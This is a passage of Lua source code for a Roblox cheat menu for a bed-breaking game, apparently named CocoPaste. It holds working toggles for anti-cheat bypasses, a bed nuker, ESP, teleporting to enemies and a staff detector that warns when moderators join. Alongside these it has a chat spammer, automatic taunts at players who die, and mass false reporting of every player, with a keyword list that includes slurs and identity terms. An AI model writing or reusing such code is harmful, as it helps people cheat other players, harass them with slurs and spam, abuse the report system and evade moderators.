					lastHealth = lplr.Character.Humanoid.Health
				until (not Antihit.Enabled)
			end)
		end
	end,
})

ChatSpammer = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "ChatSpammer",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("ChatSpammer", 1.2, "ChatSpammer has been enabled")
			task.spawn(function()
			repeat task.wait(4)

                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("///FqrVKaHnaw///", "All")
				task.wait(4)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Break some beds with CocoPaste // FqrVKaHnaw | CocoPaste On Bottom", "All")
				task.wait(4)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get some wins with CocoPaste //FqrVKaHnaw// | CocoPaste On Bottom", "All")
                task.wait(4)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Polaris? Never heard of it | CocoPaste On Bottom", "All")
                task.wait(4)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ghost Ware? Never heard of it | Pissware On Bottom", "All")
					
				until (not ChatSpammer.Enabled)
                CreateNotification("ChatSpammer", 1.2, "ChatSpammer has been disabled")
			end)
        end
    end,
})

local player = game.Players.LocalPlayer
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local sayMessageRequest = replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest

local function onPlayerDeath(deadPlayer)
    if deadPlayer.Team ~= player.Team then
        local messages = {
            "Pissware On Bottom " .. deadPlayer.Name .. " ",
            "My gaming chair is too powerful " .. deadPlayer.Name .. " ",
            "I have a good gaming chair " .. deadPlayer.Name .. " ",
            "// FqrVKaHnaw //" .. deadPlayer.Name .. " ",
            " " .. deadPlayer.Name .. " ? Never heard of it!",
            "L " .. deadPlayer.Name .. " ",
            "Hahaha " .. deadPlayer.Name .. " "
        }
        local message = messages[math.random(1, #messages)] -- Pissware
        sayMessageRequest:FireServer(message, "All")
    end
end

local function monitorPlayers()
    for _, otherPlayer in pairs(players:GetPlayers()) do
        if otherPlayer ~= player then
            local character = otherPlayer.Character
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Died:Connect(function()
                        onPlayerDeath(otherPlayer)
                    end)
                end
            end

            otherPlayer.CharacterAdded:Connect(function(character)
                local humanoid = character:WaitForChild("Humanoid")
                humanoid.Died:Connect(function()
                    onPlayerDeath(otherPlayer)
                end)
            end)
        end
    end

    players.PlayerAdded:Connect(function(newPlayer)
        newPlayer.CharacterAdded:Connect(function(character)
            local humanoid = character:WaitForChild("Humanoid")
            humanoid.Died:Connect(function()
                onPlayerDeath(newPlayer)
            end)
        end)
    end)
end

local AutoToxic = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "AutoToxic",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("AutoToxic", 1.2, "AutoToxic has been enabled")
            task.spawn(function()
                monitorPlayers()
                wait(3)
                repeat task.wait()
                until (not AutoToxic.Enabled)
                CreateNotification("AutoToxic", 1.2, "AutoToxic has been disabled")
            end)
        end
    end,
})

AutoReport = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "AutoReport",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("AutoReport", 1.2, "AutoReport has been enabled")
				repeat task.wait(0.2)
					-- 获取所有玩家的 PlayerId
local players = game:GetService("Players"):GetPlayers()

-- 创建一个空的参数表
local args = {}

-- 遍历所有玩家，除了本地玩家外，将每个玩家的 PlayerId 添加到参数表中
for _, player in ipairs(players) do if player ~= game.Players.LocalPlayer then table.insert(args, player.UserId) end end

-- 发送服务器请求
game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ReportPlayer"):FireServer(unpack(args))

				until (not AutoReport.Enabled)
				CreateNotification("AutoReport", 1.2, "AutoReport has been disabled")
			end)
		end
	end,
})

local words = {
    ['gay'] = 'Bullying',
    ['trans'] = 'Bullying',
    ['lgbt'] = 'Bullying',
    ['lesbian'] = 'Bullying',
    ['suicide'] = 'Bullying',
    ['cum'] = 'Swearing',
    ['f@g0t'] = 'Bullying',
    ['cock'] = 'Swearing',
    ['penis'] = 'Swearing',
    ['furry'] = 'Bullying',
    ['furries'] = 'Bullying',
    ['dick'] = 'Swearing',
    ['nigger'] = 'Bullying',
    ['bible'] = 'Bullying',
    ['nigga'] = 'Bullying',
    ['cheat'] = 'Scamming',
    ['report'] = 'Bullying',
    ['niga'] = 'Bullying',
    ['bitch'] = 'Bullying',
    ['sex'] = 'Swearing',
    ['cringe'] = 'Bullying',
    ['trash'] = 'Bullying',
    ['allah'] = 'Bullying',
    ['dumb'] = 'Bullying',
    ['idiot'] = 'Bullying',
    ['kid'] = 'Bullying',
    ['clown'] = 'Bullying',
    ['bozo'] = 'Bullying',
    ['faggot'] = 'Bullying',
    ['autist'] = 'Bullying',
    ['autism'] = 'Bullying',
    ['get a life'] = 'Bullying',
    ['nolife'] = 'Bullying',
    ['no life'] = 'Bullying',
    ['adopted'] = 'Bullying',
    ['skill issue'] = 'Bullying',
    ['muslim'] = 'Bullying',
    ['gender'] = 'Bullying',
    ['parent'] = 'Bullying',
    ['islam'] = 'Bullying',
    ['christian'] = 'Bullying',
    ['noob'] = 'Bullying',
    ['retard'] = 'Bullying',
    ['burn'] = 'Bullying',
    ['stupid'] = 'Bullying',
    ['wthf'] = 'Swearing',
    ['pride'] = 'Bullying',
    ['mother'] = 'Bullying',
    ['father'] = 'Bullying',
    ['homo'] = 'Bullying',
    ['hate'] = 'Bullying',
    ['exploit'] = 'Scamming',
    ['hack'] = 'Scamming',
    ['download'] = 'Scamming',
    ['youtube'] = 'Offsite Links'
}

-- 创建报告通知函数
local function ReportPlayer(player, reason)
    CreateNotification2("AutoReport", 2.3, "Reported " .. player.Name .. " for " .. reason)
end

local AutoReportV2 = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "AutoReportV2",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("AutoReportV2", 1.2, "AutoReportV2 has been enabled")
            task.spawn(function()
                game.Players.PlayerAdded:Connect(function(player)
                    player.Chatted:Connect(function(message)
                        -- 检查消息中是否包含关键字
                        for keyword, reason in pairs(words) do
                            if string.find(message:lower(), keyword) then
                                -- 执行报告
                                ReportPlayer(player, reason)
                            end
                        end
                    end)
                end)
                repeat task.wait() until (not AutoReportV2.Enabled)
                CreateNotification("AutoReportV2", 1.2, "AutoReportV2 has been disabled")
            end)
        end
    end,
})


ScytheDisabler = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "ScytheDisabler",
    ["Function"] = function(callback)
        if callback then
            local Bypassmode = Bypassmode.Value
            CreateNotification("Scythe AC Disabler", 1.2, "Scythe AC Disabler has been enabled")
            task.spawn(function()
                repeat task.wait()
                    if Bypassmode == "Bypass" then
                        local args = {
                            [1] = {
                                ["direction"] = Vector3.new(0.46722307801246643, -1.769954627306447e-09, -0.8841394782066345)
                            }
                        }
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                     isEnabled = true

                    elseif Bypassmode == "Walkspeed" then
                        isEnabled = false
                        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 26
                        local args = {
                            [1] = {
                                ["direction"] = Vector3.new(0.46722307801246643, -1.769954627306447e-09, -0.8841394782066345)
                            }
                        }
                        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer(unpack(args))
                    end
                until (not ScytheDisabler.Enabled)
                isEnabled = false
                CreateNotification("Scythe AC Disabler", 1.2, "Scythe AC Disabler has been disabled")
                resetSpeed()
            end)
        end
    end,
})
Bypassmode = ScytheDisabler.CreatePicker({
	Name = "Mode",
	Options = {"Bypass", "Walkspeed"}
})

local function getGroupRank(plr:Player)
	return plr:GetRankInGroup(5774246)
end

SemiDisaber = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "GlideSemiBypass",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("GlideSemiBypass", 1.2, "GlideSemiBypass has been enabled")
				repeat task.wait()
                    local args = {
                        [1] = "QUEEN_BEE_GLIDE"
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("useAbility"):FireServer(unpack(args))
                    CreateNotification2("GlideSemiBypass", 9, "bypassed 9 seconds Fly")
					wait(180)
				until (not SemiDisaber.Enabled)
				CreateNotification("GlideSemiBypass", 1.2, "GlideSemiBypass has been disabled")
			end)
		end
	end,
})

local staffdetectorcon
StaffDetector = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "StaffDetector",
	["Function"] = function(callback)
		if callback then
            CreateNotification("StaffDetector", 1.2, "StaffDetector has been enabled")
			task.wait(1)

			staffdetectorcon = game.Players.PlayerAdded:Connect(function(plr)

				if getGroupRank(plr) >= 2 then
					CreateNotificationStaffDetector("StaffDetector", 30, "Staff " .. plr.Name .. " Has Joined The Game !!!")
					writefile("Staff_Detection_GroupID", plr.Name)
				end
			end)
		else
			pcall(function()
				staffdetectorcon:Disconnect()
                CreateNotification("StaffDetector", 1.2, "StaffDetector has been disabled")
			end)
		end
	end,
})

local hackerdetectorcon
local heightCheckConnection
local notifiedPlayers = {} 

HackerDetector = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "HackerDetector",
    ["Function"] = function(callback)
        if callback then
            CreateNotification2("HackerDetector", 1.2, "HackerDetector has been enabled")
            task.wait(1)

            local function checkPlayerHeight(plr)
                if plr and plr.Character then
                    plr.CharacterAdded:Connect(function(character)
                        task.wait(1)
                        while character and character:FindFirstChild("HumanoidRootPart") do
                            local rootPart = character:FindFirstChild("HumanoidRootPart")
                            if rootPart and rootPart.Position.Y > 999 then
                                if not notifiedPlayers[plr.Name] then
                                    sound = Instance.new("Sound",workspace)
                                    sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
                                    sound.SoundId = "rbxassetid://7383525713"
                                    sound:Play()
                                    CreateNotification2("HackerDetector", 30, plr.Name .. " is using InfiniteFly!")
                                    writefile("HackerDetector_log", plr.Name)
                                    notifiedPlayers[plr.Name] = true
                                end
                            end
                            task.wait(1)
                        end
                    end)
                end
            end

            for _, plr in pairs(game.Players:GetPlayers()) do
                checkPlayerHeight(plr)
            end

            hackerdetectorcon = game.Players.PlayerAdded:Connect(function(plr)
                checkPlayerHeight(plr)
            end)

            heightCheckConnection = game:GetService("RunService").Stepped:Connect(function()
                for _, plr in pairs(game.Players:GetPlayers()) do
                    if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local rootPart = plr.Character:FindFirstChild("HumanoidRootPart")
                        if rootPart.Position.Y > 999 then
                            if not notifiedPlayers[plr.Name] then
                                sound = Instance.new("Sound",workspace)
                                sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
                                sound.SoundId = "rbxassetid://7383525713"
                                sound:Play()
                                CreateNotification2("HackerDetector", 30, plr.Name .. " is using InfiniteFly!")
                                writefile("HackerDetector_log", plr.Name)
                                notifiedPlayers[plr.Name] = true
                            end
                        end
                    end
                end
            end)
        else
            
            if hackerdetectorcon then
                hackerdetectorcon:Disconnect()
            end
            if heightCheckConnection then
                heightCheckConnection:Disconnect()
            end
            notifiedPlayers = {}
            CreateNotification2("HackerDetector", 1.2, "HackerDetector has been disabled")
        end
    end,
})

function IsAlive(Player)
	Player = Player or LocalPlayer

	if not Player.Character then return false end
	if not Player.Character:FindFirstChild("Humanoid") then return false end
	if Player.Character:GetAttribute("Health") <= 0 then return false end
	if not Player.Character.PrimaryPart then return false end	

	return true
end	

local function GetServerPosition(Position)
	local X = math.round(Position.X / 3)
	local Y = math.round(Position.Y / 3)
	local Z = math.round(Position.Z / 3)

	return Vector3.new(X, Y, Z)
end

function FindNearestBed(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	local NearestBed = nil

	for i, v in next, CollectionService:GetTagged("bed")do
		if v:FindFirstChild("Blanket").BrickColor ~= LocalPlayer.Team.TeamColor then			
			if v:GetAttribute("BedShieldEndTime") then 				
				if v:GetAttribute("BedShieldEndTime") < Workspace:GetServerTimeNow() then
					local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

					if Distance < MaxDistance then
						MaxDistance = Distance
						NearestBed = v
					end
				end
			end

			if not v:GetAttribute("BedShieldEndTime") then
				local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < MaxDistance then
					MaxDistance = Distance
					NearestBed = v
				end
			end
		end
	end

	return NearestBed
end

local DamageBlockRemote = game.ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DamageBlock")
local NearestBedFound = false
local CanSeeNearestBed = false

local function Nuker(NearestBed)
	task.spawn(function()
		if NearestBed then
			NearestBedFound = true

			local NukerRaycastParameters = RaycastParams.new()
			local TargetBlock = nil

			NukerRaycastParameters.FilterType = Enum.RaycastFilterType.Exclude
			NukerRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}
			NukerRaycastParameters.IgnoreWater = true

			local RaycastResult = game.Workspace:Raycast(NearestBed.Position + Vector3.new(0, 30, 0), Vector3.new(0, -35, 0), NukerRaycastParameters)

			task.spawn(function()
				if RaycastResult then
					if RaycastResult.Instance then
						TargetBlock = RaycastResult.Instance
					end

					if not RaycastResult.Instance then
						TargetBlock = NearestBed
					end				

					DamageBlockRemote:InvokeServer({
						blockRef = {
							blockPosition = GetServerPosition(TargetBlock.Position)
						},

						hitPosition = GetServerPosition(TargetBlock.Position),
						hitNormal = GetServerPosition(TargetBlock.Position)
					})
				end
			end)			

			task.spawn(function()
				local _, Value = CurrentCamera:WorldToScreenPoint(NearestBed.Position)

				CanSeeNearestBed = Value
			end)
		end
	end)
end

BedNuker = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "BedNuker",
    ["Function"] = function(callback)
        if callback then
            task.spawn(function()
                repeat
                    task.wait(0.1)

                    if IsAlive(LocalPlayer) then
                        local NearestBed = FindNearestBed(30)

                        if NearestBed then
                            Nuker(NearestBed)
                        end
                    end
                until not BedNuker.Enabled
            end)
        end
    end
})


local ESPboxes = {}
local RunService = game:GetService("RunService")

local function isVisible(targetPos)
    local targetScreenPos, onScreen = workspace.Camera:WorldToScreenPoint(targetPos)
    return onScreen and targetScreenPos.Z > 0
end

local function CreateOutline(Player)
    local BillBoard = Instance.new("BillboardGui")

    BillBoard.Size = UDim2.new(4, 0, 4, 0)
    BillBoard.AlwaysOnTop = true
    BillBoard.Name = "Esp"

    local Frame = Instance.new("Frame")

    Frame.Size = UDim2.new(1, 0, 1.5, 0)
    Frame.Position = UDim2.new(0, 0, -Player.Character.LowerTorso.Size.Y / 2 or -Player.PrimaryPart.Size.Y / 2, 0)
    Frame.BackgroundTransparency = 1

    local Stroke = Instance.new("UIStroke")

    Stroke.Thickness = 1.5
    Stroke.Color = Color3.new(1, 0.666667, 0)
    Stroke.Transparency = 0

    task.spawn(function()
        repeat
            task.wait(0.001)
            Stroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
        until not Stroke
    end)

    local UICorner = Instance.new("UICorner")

    UICorner.Parent = Frame
    UICorner.CornerRadius = UDim.new(0, 3)

    Stroke.Parent = Frame
    Frame.Parent = BillBoard
    BillBoard.Parent = Player.Character.PrimaryPart

    ESPboxes[Player] = BillBoard
end

local function RemoveOutline(Player)
    if ESPboxes[Player] then
        ESPboxes[Player]:Destroy()
        ESPboxes[Player] = nil
    end
end

local function updateESP()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = player.Character.HumanoidRootPart.Position
            if isVisible(targetPosition) then
                if not ESPboxes[player] then
                    CreateOutline(player)
                end
            else
                RemoveOutline(player)
            end
        else
            RemoveOutline(player)
        end
    end
end

ESP = GuiLibrary.API.Windows.Visuals.CreateButton({
    ["Name"] = "ESP",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("ESP", 1.2, "ESP has been enabled")
            RunService:BindToRenderStep("ESPUpdate", Enum.RenderPriority.Camera.Value + 1, updateESP)
        else
            CreateNotification("ESP", 1.2, "ESP has been disabled")
            RunService:UnbindFromRenderStep("ESPUpdate")
            for _, player in pairs(game.Players:GetPlayers()) do
                RemoveOutline(player)
            end
        end
    end,
})


local lighting = game:GetService("Lighting")

Night = GuiLibrary.API.Windows.Visuals.CreateButton({
	["Name"] = "Night",
	["Function"] = function(callback)
		if callback then
			CreateNotification("Night", 1.2, "Night has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
					lighting.ClockTime = 0 
					lighting.Brightness = 2  
					lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)  
				until (not Night.Enabled)
				CreateNotification("Night", 1.2, "Night has been disabled")
				lighting.ClockTime = 14
			end)
		end
	end,
})

local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera

Atmosphere = GuiLibrary.API.Windows.Visuals.CreateButton({
	["Name"] = "Atmosphere",
	["Function"] = function(callback)
		if callback then
			CreateNotification("Atmosphere", 1.2, "Atmosphere has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)

local existingEffect = camera:FindFirstChildOfClass("ColorCorrectionEffect")
if existingEffect then
    existingEffect:Destroy()
end


local colorCorrection = Instance.new("ColorCorrectionEffect")
colorCorrection.Parent = camera
colorCorrection.TintColor = Color3.fromRGB(138, 43, 226)  
colorCorrection.Brightness = 0  
colorCorrection.Contrast = 0  
				until (not Atmosphere.Enabled)
				CreateNotification("Atmosphere", 1.2, "Atmosphere has been disabled")
				
local existingEffect = camera:FindFirstChildOfClass("ColorCorrectionEffect")
if existingEffect then
    existingEffect:Destroy()
                end
			end)
		end
	end,
})

Trails = GuiLibrary.API.Windows.Visuals.CreateButton({
    ["Name"] = "Trails",
    ["Function"] = function(callback)
        if callback then
            local ar=Instance.new("Trail")local as=Instance.new("Attachment")local at=Instance.new("Attachment")ar.Parent=game.Players.LocalPlayer.Character.HumanoidRootPart;color1=Color3.new(15/255,127/255,254/255)color2=Color3.new(255/255,255/255,255/25)ar.Color=ColorSequence.new(color1,color2)as.Parent=game.Players.LocalPlayer.Character.HumanoidRootPart;at.Parent=game.Players.LocalPlayer.Character.HumanoidRootPart;ar.Attachment0=as;ar.Attachment1=at;ar.Enabled=true;as.Position=Vector3.new(.1,-2.5,0)at.Position=Vector3.new(-.1,-2.5,0)
        end
    end
})

AntiVoid = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "AntiVoid",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AntiVoid", 1.2, "AntiVoid has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
					local player = game.Players.LocalPlayer
					local character = player.Character or player.CharacterAdded:Wait()
					
					local function spawnPartUnderPlayer()
						local part = game.Workspace:FindFirstChild("JumpPart")
					
						if not part then
							part = Instance.new("Part")
							part.Name = "JumpPart"
							part.Size = Vector3.new(2048, 1, 2048)
							part.Anchored = true
							local playerPosition = character.PrimaryPart.Position
							part.Position = Vector3.new(playerPosition.X, playerPosition.Y - 18, playerPosition.Z)
							part.BrickColor = BrickColor.new("Bright violet")
							part.Transparency = 0.7
							part.Parent = game.Workspace
						end
					
						local function onTouch(hit)
							local character = hit.Parent
							local humanoid = character and character:FindFirstChildOfClass("Humanoid")
							if humanoid then
								local jumpVelocity = Vector3.new(0, math.sqrt(2 * 100 * 196.25) * 0.5, 0)
								humanoid.RootPart.Velocity = jumpVelocity
							end
						end
					
						part.Touched:Connect(onTouch)
					
						function partDestroy()
							if part then
								part:Destroy()
								part = nil
							end
						end
					end
					
					spawnPartUnderPlayer()
					
					
				until (not AntiVoid.Enabled)
				CreateNotification("AntiVoid", 1.2, "AntiVoid has been disabled")
				partDestroy()
			end)
		end
	end,
})


local GrappleHook = true
local tppp = false
GrappleHookTp = GuiLibrary.API.Windows.World.CreateButton({
	["Name"] = "GrappleHookTpAura",
	["Function"] = function(callback)
		if callback then
			CreateNotification("GrappleHookTAura", 1.2, "GrappleHookTAura has been enabled")
			task.spawn(function()
				repeat task.wait()
					local target = getNearestPlayer(9e9)
					if target then
						local bows = getgrapple()
						for i,v in pairs(bows) do
							spoofHand(v.Name)
							task.wait()
							if v.Name == "grappling_hook" then
								if not GrappleHook then continue end
							end
							shoot(v,target.Character.PrimaryPart.Position)
						end
					end
				until (not GrappleHookTp.Enabled)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23
				CreateNotification("GrappleHookTAura", 1.2, "GrappleHookTAura has been disabled")
			end)
		else

		end
	end,
})

local function teleportToRandomPlayer()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
    wait(0.2)

    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local lplr = Players.LocalPlayer

    local function checkHealth()
        repeat
            wait()
        until lplr.Character and lplr.Character:FindFirstChild("Humanoid") and lplr.Character.Humanoid.Health == 100

        -- 停止偵測後執行以下代碼
        local availablePlayers = {}

        for _, player in pairs(Players:GetPlayers()) do
            if player.TeamColor ~= lplr.TeamColor then
                table.insert(availablePlayers, player)
            end
        end

        if #availablePlayers > 0 then
            local selectedPlayer = availablePlayers[math.random(1, #availablePlayers)]
            local part = selectedPlayer.Character.HumanoidRootPart
            local duration = 0.4 -- tp speed

            local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(lplr.Character.HumanoidRootPart, tweenInfo, {CFrame = part.CFrame * CFrame.new(0, 5, 0)})
            tween:Play()
            tween.Completed:Wait()
        else
            print("There are no available players with different team color.")
        end
    end

    checkHealth()
end


local function moveToDifferentTeamPlayer()
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")

    local lplr = Players.LocalPlayer

    game:GetService("VirtualInputManager"):SendKeyEvent(true, "C", false, game)
    wait(6.3)

    local availablePlayers = {}

    for _, player in pairs(Players:GetPlayers()) do
        if player.TeamColor ~= lplr.TeamColor then
            table.insert(availablePlayers, player)
        end
    end

    if #availablePlayers > 0 then
        local selectedPlayer = availablePlayers[math.random(1, #availablePlayers)]
        local part = selectedPlayer.Character.HumanoidRootPart
        local duration = 0.4

        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)

        local moveTween = TweenService:Create(lplr.Character.HumanoidRootPart, tweenInfo, {CFrame = part.CFrame * CFrame.new(0, 5, 0)})
        moveTween:Play()
        moveTween.Completed:Wait()
    else
        print("There are no available players with different team color.")
    end
end

local tppp = false

RecallTp = GuiLibrary.API.Windows.World.CreateButton({
    ["Name"] = "RecallPlayerTp",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("RecallPlayerTp", 1.2, "RecallPlayerTp has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    moveToDifferentTeamPlayer()
                until (not tppp)
                CreateNotification("RecallPlayerTp", 1.2, "RecallPlayerTp has been disabled")
            end)
        else
           
        end
    end,
})

DeathPlayerTp = GuiLibrary.API.Windows.World.CreateButton({
    ["Name"] = "DeathPlayerTp",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("DeathPlayerTp", 1.2, "DeathPlayerTp has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    teleportToRandomPlayer()
                until (not tppp)
                CreateNotification("DeathPlayerTp", 1.2, "DeathPlayerTp has been disabled")
            end)
        else
            
        end
    end,
})


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

function IsAlive(plr)
    plr = plr or LocalPlayer
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health <= 0 then return false end
    return true
end

function GetClosestPlayer()
    local target = nil
    local distance = 25
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Team ~= LocalPlayer.Team and IsAlive(v) and not v.Character:FindFirstChildOfClass("ForceField") then
            local plrdist = (v.Character:FindFirstChildOfClass('Humanoid').RootPart.Position - LocalPlayer.Character:FindFirstChildOfClass('Humanoid').RootPart.Position).magnitude
            if plrdist < distance then
                target = v
                distance = plrdist
            end
        end
    end
    return target
end

local TargetInfoHUD, Health, Meter, HP, TextLabel, Frame

local function CreateTargetInfoHUD()
    -- Instances
    TargetInfoHUD = Instance.new("ScreenGui")
    Health = Instance.new("Frame")
    Meter = Instance.new("Frame")
    local Health2 = Instance.new("TextLabel")
    local ImageLabel = Instance.new("ImageLabel")
    HP = Instance.new("TextLabel")
    TextLabel = Instance.new("TextLabel")
    local ImageLabel_2 = Instance.new("ImageLabel")
    local UICorner = Instance.new("UICorner")
    Frame = Instance.new("Frame")

    -- Properties
    TargetInfoHUD.Name = "TargetInfoHUD"
    TargetInfoHUD.Parent = game.CoreGui
    TargetInfoHUD.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Health.Name = "Health"
    Health.Parent = TargetInfoHUD
    Health.BackgroundColor3 = Color3.fromRGB(15, 15, 18) -- Example color
    Health.BackgroundTransparency = 0.600
    Health.BorderColor3 = Color3.fromRGB(27, 42, 53)
    Health.BorderSizePixel = 0
    Health.Position = UDim2.new(0.394206524, 0, 0.653802395, 0)
    Health.Size = UDim2.new(0, 227, 0, 102)

    Meter.Name = "Meter"
    Meter.Parent = Health
    Meter.BackgroundColor3 = Color3.fromRGB(60, 189, 0) -- Example color
    Meter.BorderColor3 = Color3.fromRGB(27, 42, 53)
    Meter.BorderSizePixel = 0
    Meter.Position = UDim2.new(0.152766719, 0, 0.68932277, 0)
    Meter.Size = UDim2.new(0, 172, 0, 2)

    Health2.Name = "Health2"
    Health2.Parent = Health
    Health2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Health2.BackgroundTransparency = 1
    Health2.Position = UDim2.new(0.373565435, 0, 0.320388347, 0)
    Health2.Size = UDim2.new(0, 49, 0, 17)
    Health2.Font = Enum.Font.Arial
    Health2.Text = "Health:"
    Health2.TextColor3 = Color3.fromRGB(255, 255, 255)
    Health2.TextScaled = true
    Health2.TextSize = 14
    Health2.TextWrapped = true
    Health2.TextXAlignment = Enum.TextXAlignment.Left

    ImageLabel.Parent = Health
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BorderColor3 = Color3.fromRGB(0, 255, 0)
    ImageLabel.Position = UDim2.new(0.0621761642, 0, 0.0873786435, 0)
    ImageLabel.Size = UDim2.new(0, 55, 0, 51)
    ImageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

    HP.Name = "HP"
    HP.Parent = Health
    HP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    HP.BackgroundTransparency = 1
    HP.Position = UDim2.new(0.604086936, 0, 0.320388347, 0)
    HP.Size = UDim2.new(0, 49, 0, 17)
    HP.Font = Enum.Font.Arial
    HP.Text = "https://discord.gg/ZA9fx9hP6b"
    HP.TextColor3 = Color3.fromRGB(255, 255, 255)
    HP.TextScaled = true
    HP.TextSize = 14
    HP.TextWrapped = true
    HP.TextXAlignment = Enum.TextXAlignment.Left

    TextLabel.Parent = Health
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Position = UDim2.new(0.373565465, 0, 0.0873786435, 0)
    TextLabel.Size = UDim2.new(0, 120, 0, 17)
    TextLabel.Font = Enum.Font.Arial
    TextLabel.Text = "progamers123131"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left

    ImageLabel_2.Parent = Health
    ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel_2.BackgroundTransparency = 1
    ImageLabel_2.Position = UDim2.new(0.010362694, 0, 0.631067991, 0)
    ImageLabel_2.Size = UDim2.new(0, 19, 0, 16)
    ImageLabel_2.Image = "rbxassetid://7072717560"

    Frame.Parent = TargetInfoHUD
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.394206524, 0, 0.653802395, -9)
    Frame.Size = UDim2.new(0, 227, 0, 14)

    UICorner.Parent = Health
end

local function UpdateTargetInfo()
    local targetPlayer = GetClosestPlayer()
    if targetPlayer then
        if not TargetInfoHUD then
            CreateTargetInfoHUD()
            local TweenInformation = TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
            local LoadingFrameTween = TweenService:Create(Health, TweenInformation, {Size = UDim2.new(0, 227, 0, 102)})
            LoadingFrameTween:Play()
        end
        
        local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
        
        if targetHumanoid then
            local healthColor = Color3.fromRGB(235, 235, 0):Lerp(Color3.fromRGB(85, 255, 0), targetHumanoid.Health / targetHumanoid.MaxHealth)
            local healthChange = targetHumanoid.Health / targetHumanoid.MaxHealth
            
            TargetInfoHUD.Enabled = true
